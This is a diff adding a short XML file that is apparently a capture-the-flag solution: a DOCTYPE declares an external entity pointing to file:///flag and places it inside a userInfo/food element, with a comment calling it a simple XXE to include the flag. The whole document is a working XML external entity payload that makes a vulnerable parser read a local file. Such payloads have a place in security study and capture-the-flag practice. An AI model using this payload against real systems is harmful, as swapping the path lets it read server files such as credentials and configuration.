@@ -1,0 +1,11 @@
+<!--?xml version="1.0" ?-->
+
+<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///flag"> ]>
+
+ <userInfo>
+
+  <food>&example;</food>
+
+ </userInfo>
+
+simple xxe to include flag
